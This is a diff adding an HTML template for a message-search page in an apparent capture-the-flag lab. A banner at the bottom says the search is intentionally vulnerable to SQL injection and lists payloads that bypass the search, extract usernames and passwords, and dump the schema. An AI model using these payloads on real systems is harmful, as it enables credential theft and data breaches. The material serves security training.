@@ -1,0 +1,55 @@
+{% extends "base.html" %}
+
+{% block title %}Search Messages - CTF Lab{% endblock %}
+
+{% block content %}
+<h2 style="color: #2c3e50; margin-bottom: 20px;">Search Messages</h2>
+
+<div class="search-form">
+    <form method="GET" action="{{ url_for('search') }}">
+        <input type="text" name="q" value="{{ search_term or '' }}" placeholder="Enter search term..." required>
+        <button type="submit" class="btn">Search</button>
+    </form>
+</div>
+
+{% if search_term %}
+    <h3 style="color: #2c3e50; margin-bottom: 20px;">
+        Search Results for: "{{ search_term }}"
+        {% if messages %}
+            <span style="font-size: 14px; color: #7f8c8d;">({{ messages|length }} result{{ 's' if messages|length != 1 else '' }})</span>
+        {% endif %}
+    </h3>
+{% endif %}
+
+{% if messages %}
+    {% for message in messages %}
+        <div class="message">
+            <div class="message-header">{{ message.username }}</div>
+            <div style="margin: 10px 0;">{{ message.message }}</div>
+            <div class="message-time">{{ message.created_at }}</div>
+        </div>
+    {% endfor %}
+{% elif search_term %}
+    <div style="text-align: center; padding: 40px; color: #7f8c8d;">
+        <p>No messages found matching your search criteria.</p>
+    </div>
+{% else %}
+    <div style="text-align: center; padding: 40px; color: #7f8c8d;">
+        <p>Enter a search term to find messages.</p>
+    </div>
+{% endif %}
+
+<div style="margin-top: 30px; padding: 20px; background-color: #fff3cd; border-radius: 5px; border-left: 4px solid #ffc107;">
+    <h4 style="color: #856404; margin-bottom: 10px;">⚠️ SQL Injection Challenge</h4>
+    <p style="color: #856404; margin-bottom: 10px;">
+        This search function is vulnerable to SQL injection. Try these payloads:
+    </p>
+    <ul style="color: #856404; margin-left: 20px; font-family: monospace; font-size: 14px;">
+        <li><code>' OR '1'='1</code> - Basic bypass</li>
+        <li><code>' UNION SELECT username, password, 'admin' FROM users--</code> - Extract user data</li>
+        <li><code>' UNION SELECT sql, 'table', 'structure' FROM sqlite_master--</code> - Database schema</li>
+        <li><code>' AND 1=2 UNION SELECT name, 'column', 'info' FROM pragma_table_info('users')--</code> - Table structure</li>
+    </ul>
+</div>
+{% endblock %}
+
